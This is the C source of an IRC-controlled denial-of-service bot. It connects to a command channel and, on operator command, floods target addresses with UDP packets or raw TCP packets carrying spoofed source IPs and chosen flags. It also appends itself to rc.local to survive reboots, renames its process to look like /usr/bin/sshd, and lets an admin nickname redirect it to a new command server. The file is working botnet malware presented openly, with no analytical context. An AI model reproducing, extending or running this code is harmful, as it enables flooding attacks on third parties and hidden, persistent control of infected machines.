int numservers=1;
char *servers[] = {
"SERVERIP",
(void*)0
};
static char *irc_port = ("443");
static char *irc_chan = ("#FROG");
char *admin = ("ADMIN USER");
char *bot_prefix = ("FROG");
char *unk_msg = ("[UNK] Attacking");
char *udp_msg = ("[UDP] Attacking");
char *std_msg = ("[STD] Attacking");
char *tcp_msg = ("[TCP] Attacking");
char *syn_msg = ("[SYN] Attacking");
char *ack_msg = ("[ACK] Attacking");
char *fin_msg = ("[FIN] Attacking");
char *rst_msg = ("[RST] Attacking");
char *psh_msg = ("[PSH] Attacking");
#undef IDENT
#define KEY ""
#define PASS ""
#define STARTUP
#define PREFIX ("%s",bot_prefix)
#define PORT atol(irc_port)
#define CHAN ("%s",irc_chan)
#define STD2_SIZE 50
#define STD2_STRING "std"
#define FAKENAME "/usr/bin/sshd"
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
int sock,changeservers=0;
char *server, *chan, *key, *nick, *ident, *prefix, *user, *pass, disabled=0, udpTry = 0;
unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(unsigned char* pattern, unsigned char* string) {
switch((unsigned char)*pattern) {
case '\0': return *string;
case 'b': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case 'o': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case 't': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case 'B': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case 'O': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case 'T': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
case '?': return !(*string && !strwildmatch(pattern+1, string+1));
default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
}
}
int Send(int sock, char *words, ...) {
static char textBuffer[1024];
va_list args;
va_start(args, words);
vsprintf(textBuffer, words, args);
va_end(args);
return write(sock,textBuffer,strlen(textBuffer));
}
unsigned int host2ip(char *sender,char *hostname) {
static struct in_addr i;
struct hostent *h;
if((i.s_addr = inet_addr(hostname)) == -1) {
if((h = gethostbyname(hostname)) == NULL) {
Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
exit(0);
}
bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
}
return i.s_addr;
}
int mfork(char *sender) {
unsigned int parent, *newpids, i;
if (disabled == 1) {
Send(sock,"NOTICE %s :Unable to comply.\n",sender);
return 1;
}
parent=fork();
if (parent <= 0) return parent;
numpids++;
newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
newpids[numpids-1]=parent;
free(pids);
pids=newpids;
return parent;
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
char *tmp;
int len=(rand()%5)+4,i;
FILE *file;
tmp=(char*)malloc(len+1);
memset(tmp,0,len+1);
char *pre;
if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
else {
int a=((rand()*rand())%45402)+1;
char buf[1024];
for (i=0;i<a;i++) fgets(buf,1024,file);
memset(buf,0,1024);
fgets(buf,1024,file);
filter(buf);
memcpy(tmp,buf,len);
fclose(file);
}
return tmp;
}
void identd() {
int sockname,sockfd,sin_size,tmpsock,i;
struct sockaddr_in my_addr,their_addr;
char szBuffer[1024];
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
my_addr.sin_family = AF_INET;
my_addr.sin_port = htons(113);
my_addr.sin_addr.s_addr = INADDR_ANY;
memset(&(my_addr.sin_zero), 0, 8);
if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
if (listen(sockfd, 1) == -1) return;
if (fork() == 0) return;
sin_size = sizeof(struct sockaddr_in);
if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
for(;;) {
fd_set bla;
struct timeval timee;
FD_ZERO(&bla);
FD_SET(tmpsock,&bla);
timee.tv_sec=timee.tv_usec=60;
if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
if (FD_ISSET(tmpsock,&bla)) break;
}
i = recv(tmpsock,szBuffer,1024,0);
if (i <= 0 || i >= 20) exit(0);
szBuffer[i]=0;
if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
close(tmpsock);
close(sockfd);
exit(0);
}
long pow(long a, long b) {
if (b == 0) return 1;
if (b == 1) return a;
return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
register int nleft = len;
register u_short *w = addr;
register int sum = 0;
u_short answer =0;
while (nleft > 1) {
sum += *w++;
nleft -= 2;
}
if (nleft == 1) {
*(u_char *)(&answer) = *(u_char *)w;
sum += answer;
}
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;
return(answer);
}
unsigned long getspoof() {
if (!spoofs) return rand();
if (spoofsm == 1) return ntohl(spoofs);
return ntohl(spoofs+(rand() % spoofsm)+1);
}
struct send_tcp {
struct iphdr ip;
struct tcphdr tcp;
char buf[20];
};
struct pseudo_header {
unsigned int source_address;
unsigned int dest_address;
unsigned char placeholder;
unsigned char protocol;
unsigned short tcp_length;
struct tcphdr tcp;
char buf[20];
};
int getHost(unsigned char *toGet, struct in_addr *i) {
struct hostent *h;
if((i->s_addr = inet_addr(toGet)) == -1) return 1;
return 0;
}
void std(int sock, char *sender, int argc, char **argv) {
int flag=1,fd,i;
unsigned long secs;
struct hostent *hp;
struct sockaddr_in in;
time_t start=time(NULL);
if (mfork(sender) != 0) return;
if (argc < 2) {
exit(1);
}
secs=atol(argv[3]);
memset((void*)&in,0,sizeof(struct sockaddr_in));
in.sin_addr.s_addr=host2ip(sender,argv[1]);
in.sin_family = AF_INET;
Send(sock,"NOTICE %s :%s %s\n",sender,std_msg,argv[1]);
while(1) {
in.sin_port = atol(argv[2]);
if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
else {
flag=1;
ioctl(fd,FIONBIO,&flag);
sendto(fd,STD2_STRING,STD2_SIZE,0,(struct sockaddr*)&in,sizeof(in));
close(fd);
}
if (i >= 50) {
if (time(NULL) >= start+secs) break;
i=0;
}
i++;
}
close(fd);
exit(0);
}
void udp(int sock, char *sender, int argc, char **argv) {
int flag=1,fd,i;
unsigned long secs;
char *buf=(char*)malloc(9216);
struct hostent *hp;
struct sockaddr_in in;
time_t start=time(NULL);
if (mfork(sender) != 0) return;
if (argc < 2) {
exit(1);
}
secs=atol(argv[3]);
memset((void*)&in,0,sizeof(struct sockaddr_in));
in.sin_addr.s_addr=host2ip(sender,argv[1]);
in.sin_family = AF_INET;
Send(sock,"NOTICE %s :%s %s\n",sender,udp_msg,argv[1]);
while(1) {
in.sin_port = atol(argv[2]);
if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
else {
flag=1;
ioctl(fd,FIONBIO,&flag);
sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
close(fd);
}
if (i >= 50) {
if (time(NULL) >= start+secs) break;
i=0;
}
i++;
}
close(fd);
exit(0);
}
void unk(int sock, char *sender, int argc, char **argv) {
int flag=1,fd,i;
unsigned long secs;
char *buf=(char*)malloc(9216);
struct hostent *hp;
struct sockaddr_in in;
time_t start=time(NULL);
if (mfork(sender) != 0) return;
if (argc < 2) {
exit(1);
}
secs=atol(argv[2]);
memset((void*)&in,0,sizeof(struct sockaddr_in));
in.sin_addr.s_addr=host2ip(sender,argv[1]);
in.sin_family = AF_INET;
Send(sock,"NOTICE %s :%s %s\n",sender,unk_msg,argv[1]);
while(1) {
in.sin_port = rand();
if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
else {
flag=1;
ioctl(fd,FIONBIO,&flag);
sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
close(fd);
}
if (i >= 50) {
if (time(NULL) >= start+secs) break;
i=0;
}
i++;
}
close(fd);
exit(0);
}
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
static uint32_t Q[4096], c = 362436;
unsigned short csum (unsigned short *buf, int count)
{
register uint64_t sum = 0;
while( count > 1 ) { sum += *buf++; count -= 2; }
if(count > 0) { sum += *(unsigned char *)buf; }
while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
return (uint16_t)(~sum);
}
uint32_t rand_cmwc(void)
{
uint64_t t, a = 18782LL;
static uint32_t i = 4095;
uint32_t x, r = 0xfffffffe;
i = (i + 1) & 4095;
t = a * Q[i] + c;
c = (uint32_t)(t >> 32);
x = t + c;
if (x < c) {
x++;
c++;
}
return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
struct tcp_pseudo
{
unsigned long src_addr;
unsigned long dst_addr;
unsigned char zero;
unsigned char proto;
unsigned short length;
} pseudohead;
unsigned short total_len = iph->tot_len;
pseudohead.src_addr=iph->saddr;
pseudohead.dst_addr=iph->daddr;
pseudohead.zero=0;
pseudohead.proto=IPPROTO_TCP;
pseudohead.length=htons(sizeof(struct tcphdr));
int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
unsigned short *tcp = malloc(totaltcp_len);
memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
unsigned short output = csum(tcp,totaltcp_len);
free(tcp);
return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
iph->ihl = 5;
iph->version = 4;
iph->tos = 0;
iph->tot_len = sizeof(struct iphdr) + packetSize;
iph->id = rand_cmwc();
iph->frag_off = 0;
iph->ttl = MAXTTL;
iph->protocol = protocol;
iph->check = 0;
iph->saddr = source;
iph->daddr = dest;
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int got = 1, total = 0;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got == 0 ? NULL : buffer;
}
int getOurIP()
{
int sock = socket(AF_INET, SOCK_DGRAM, 0);
if(sock == -1) return 0;
struct sockaddr_in serv;
memset(&serv, 0, sizeof(serv));
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = inet_addr("8.8.8.8");
serv.sin_port = htons(53);
int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
if(err == -1) return 0;
struct sockaddr_in name;
socklen_t namelen = sizeof(name);
err = getsockname(sock, (struct sockaddr*) &name, &namelen);
if(err == -1) return 0;
ourIP.s_addr = name.sin_addr.s_addr;
int cmdline = open("/proc/net/route", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
if(strstr(linebuf, "\t00000000\t") != NULL)
{
unsigned char *pos = linebuf;
while(*pos != '\t') pos++;
*pos = 0;
break;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
if(*linebuf)
{
int i;
struct ifreq ifr;
strcpy(ifr.ifr_name, linebuf);
ioctl(sock, SIOCGIFHWADDR, &ifr);
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}
close(sock);
}
void tcp(int sock, char *sender, int argc, char **argv)
{
if(argc < 7) {
} else {
register unsigned int pollRegister;
pollRegister = atol(argv[7]);
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(atol(argv[2]) == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = atol(argv[2]);
if(getHost(strdup(argv[1]), &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
if(!sockfd)
{
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
return;
}
in_addr_t netmask;
if ( atol(argv[4]) == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - atol(argv[4]))) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + atol(argv[6])];
struct iphdr *iph = (struct iphdr *)packet;
struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + atol(argv[6]));
tcph->source = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->ack_seq = 0;
tcph->doff = 5;
if(!strcmp(strdup(argv[5]), "all"))
{
tcph->syn = 1;
tcph->rst = 1;
tcph->fin = 1;
tcph->ack = 1;
tcph->psh = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,tcp_msg,argv[1]);
} else {
unsigned char *pch = strtok(strdup(argv[5]), ",");
while(pch)
{
if(!strcmp(pch,         "syn"))
{
tcph->syn = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,syn_msg,argv[1]);
} else if(!strcmp(pch,  "rst"))
{
tcph->rst = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,rst_msg,argv[1]);
} else if(!strcmp(pch,  "fin"))
{
tcph->fin = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,fin_msg,argv[1]);
} else if(!strcmp(pch,  "ack"))
{
tcph->ack = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,ack_msg,argv[1]);
} else if(!strcmp(pch,  "psh"))
{
tcph->psh = 1;
Send(sock,"NOTICE %s :%s %s\n",sender,psh_msg,argv[1]);
} else {
}
pch = strtok(NULL, ",");
}
}
tcph->window = rand_cmwc();
tcph->check = 0;
tcph->urg_ptr = 0;
tcph->dest = (atol(argv[2]) == 0 ? rand_cmwc() : atol(argv[2]));
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + atol(argv[3]);
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
iph->saddr = htonl( getRandomIP(netmask) );
iph->id = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->source = rand_cmwc();
tcph->check = 0;
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}
}
void ssh_scan(int sock, char *sender, int argc, char **argv) {
}
void telnet_scan(int sock, char *sender, int argc, char **argv) {
}
void killsec(int sock, char *sender, int argc, char **argv) {
if(strcasecmp(admin,sender) == 0){
kill(0,9);
} else {
Send(sock,"PRIVMSG %s :You do not have permission to do this.\n", chan);
}
}
void stop(int sock, char *sender, int argc, char **argv){
unsigned long i;
for (i=0;i<numpids;i++) {
if (pids[i] != 0 && pids[i] != getpid()) {
if (sender) Send(sock,"PRIVMSG %s :Killing PID %d.\n",chan,pids[i]);
kill(pids[i],9);
}
}
for (i = 0; i < numpids; i++) {
if (pids[i] != 0 && pids[i] != getpid()) {
kill(pids[i], 9);
}
}
}
void spoof(int sock, char *sender, int argc, char **argv) {
char ip[256];
int i, num;
unsigned long uip;
if (argc != 1) {
Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
spoofs=0;
spoofsm=0;
return;
}
if (strlen(argv[1]) > 16) {
Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
return;
}
strcpy(ip,argv[1]);
if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
num=-(num-4);
for (i=0;i<num;i++) strcat(ip,".0");
uip=inet_network(ip);
if (num == 0) spoofsm=1;
else spoofsm=pow(256,num);
spoofs=uip;
Send(sock,"NOTICE %s :Subnet Has Been Spoofed - %s.\n",sender, argv[1]);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
unsigned long a=spoofs,b=spoofs+(spoofsm-1);
if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void move(int sock, char *sender, int argc, char **argv) {
if (argc < 1) {
} else {
if(strcasecmp(admin,sender) == 0) {
server = strdup(argv[1]);
changeservers = 1;
close(sock);
} else {
Send(sock,"PRIVMSG %s :You do not have permission to do this.\n", chan);
}
}
}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
{ "+std"                    ,           std },
{ "+udp"                    ,           udp },
{ "+unk"                    ,           unk },
{ "+tcp"                    ,           tcp },
{ "+spoof"                  ,         spoof },
{ "+server"                 ,          move },
{ "+subnet"                 ,     getspoofs },
{ "+botkill"                ,       killsec },
{ "+killattk"               ,          stop },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
int i;
char *to, *message;
for (i=0;i<strlen(str) && str[i] != ' ';i++);
str[i]=0;
to=str;
message=str+i+2;
for (i=0;i<strlen(sender) && sender[i] != '!';i++);
sender[i]=0;
if (*message == '>' && !strcasecmp(to,chan)) {
char *params[12], name[1024]={0};
int num_params=0, m;
message++;
for (i=0;i<strlen(message) && message[i] != ' ';i++);
message[i]=0;
if (strwildmatch(message,nick)) return;
message+=i+1;
m=strlen(message);
for (i=0;i<m;i++) {
if (*message == ' ' || *message == 0) break;
name[i]=*message;
message++;
}
for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
num_params++;
if (num_params > 10) num_params=10;
params[0]=name;
params[num_params+1]="\0";
m=1;
while (*message != 0) {
message++;
if (m >= num_params) break;
for (i=0;i<strlen(message) && message[i] != ' ';i++);
params[m]=(char*)malloc(i+1);
strncpy(params[m],message,i);
params[m][i]=0;
m++;
message+=i;
}
for (m=0; flooders[m].cmd != (char *)0; m++) {
if (!strcasecmp(flooders[m].cmd,name)) {
flooders[m].func(sock,sender,num_params-1,params);
for (i=1;i<num_params;i++) free(params[i]);
return;
}
}
}
}
void _376(int sock, char *sender, char *str) {
Send(sock,"MODE %s +pixB\n",nick);
Send(sock,"JOIN %s :%s\n",chan,key);
Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
int i,d;
char *msg=str;
struct hostent *hostm;
unsigned long m;
for (i=0,d=0;d<5;d++) {
for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
if (i == strlen(str)) return;
}
for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
msg[i]=0;
if (!strcasecmp(msg,nick) && !spoofsm) {
msg=str;
for (i=0,d=0;d<3;d++) {
for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
if (i == strlen(str)) return;
}
for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
msg[i]=0;
if ((m = inet_addr(msg)) == -1) {
if ((hostm=gethostbyname(msg)) == NULL) {
return;
}
memcpy((char*)&m, hostm->h_addr, hostm->h_length);
}
((char*)&spoofs)[3]=((char*)&m)[0];
((char*)&spoofs)[2]=((char*)&m)[1];
((char*)&spoofs)[1]=((char*)&m)[2];
((char*)&spoofs)[0]=0;
spoofsm=256;
}
}
void _433(int sock, char *sender, char *str) {
free(nick);
char tempnick[50];
char *strpref = PREFIX;
char *genname = makestring();
strcpy(tempnick,strpref);
strcat(tempnick,genname);
nick=tempnick;
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
{   "352",     _352     },
{   "376",     _376     },
{   "433",     _433     },
{   "422",     _376     },
{ "PRIVMSG", _PRIVMSG   },
{   "PING",    _PING    },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
struct sockaddr_in srv;
unsigned long ipaddr,start;
int flag;
struct hostent *hp;
start:
sock=-1;
flag=1;
if (changeservers == 0) server=servers[rand()%numservers];
changeservers=0;
while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
if (inet_addr(server) == 0 || inet_addr(server) == -1) {
if ((hp = gethostbyname(server)) == NULL) {
server=NULL;
close(sock);
goto start;
}
bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
}
else srv.sin_addr.s_addr=inet_addr(server);
srv.sin_family = AF_INET;
srv.sin_port = htons(PORT);
ioctl(sock,FIONBIO,&flag);
start=time(NULL);
while(time(NULL)-start < 10) {
errno=0;
if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
return;
}
if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
sleep(1);
}
server=NULL;
close(sock);
goto start;
}
int main(int argc, char *argv[]) {
int on,i;
char cwd[256],*str;
FILE *file;
#ifdef STARTUP
str="/etc/rc.d/rc.local";
file=fopen(str,"r");
if (file == NULL) {
str="/etc/rc.conf";
file=fopen(str,"r");
}
if (file != NULL) {
char outfile[256], buf[1024];
int i=strlen(argv[0]), d=0;
getcwd(cwd,256);
if (strcmp(cwd,"/")) {
while(argv[0][i] != '/') i--;
sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
while(!feof(file)) {
fgets(buf,1024,file);
if (!strcasecmp(buf,outfile)) d++;
}
if (d == 0) {
FILE *out;
fclose(file);
out=fopen(str,"a");
if (out != NULL) {
fputs(outfile,out);
fclose(out);
}
}
else fclose(file);
}
else fclose(file);
}
#endif
if (fork()) exit(0);
#ifdef FAKENAME
strncpy(argv[0],FAKENAME,strlen(argv[0]));
for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
srand((time(NULL) ^ getpid()) + getppid());
char tempnick[50];
char *strpref = PREFIX;
char *genname = makestring();
strcpy(tempnick,strpref);
strcat(tempnick,genname);
nick=tempnick;
ident="Remote";
user="Remote IRC Bot";
chan=CHAN;
key=KEY;
pass=PASS;
server=NULL;
sa:
#ifdef IDENT
for (i=0;i<numpids;i++) {
if (pids[i] != 0 && pids[i] != getpid()) {
kill(pids[i],9);
waitpid(pids[i],NULL,WNOHANG);
}
}
pids=NULL;
numpids=0;
identd();
#endif
con();
Send(sock,"PASS %s\n", pass);
Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
while(1) {
unsigned long i;
fd_set n;
struct timeval tv;
FD_ZERO(&n);
FD_SET(sock,&n);
tv.tv_sec=60*20;
tv.tv_usec=0;
if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
unsigned int *newpids,on;
for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
pids[on-1]=0;
numpids--;
newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
for (on=0;on<numpids;on++) newpids[on]=pids[on];
free(pids);
pids=newpids;
}
if (FD_ISSET(sock,&n)) {
char buf[4096], *str;
int i;
if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
buf[i]=0;
str=strtok(buf,"\n");
while(str && *str) {
char name[1024], sender[1024];
filter(str);
if (*str == ':') {
for (i=0;i<strlen(str) && str[i] != ' ';i++);
str[i]=0;
strcpy(sender,str+1);
strcpy(str,str+i+1);
}
else strcpy(sender,"*");
for (i=0;i<strlen(str) && str[i] != ' ';i++);
str[i]=0;
strcpy(name,str);
strcpy(str,str+i+1);
for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
if (!strcasecmp(name,"ERROR")) goto sa;
str=strtok((char*)NULL,"\n");
}
}
}
return 0;
}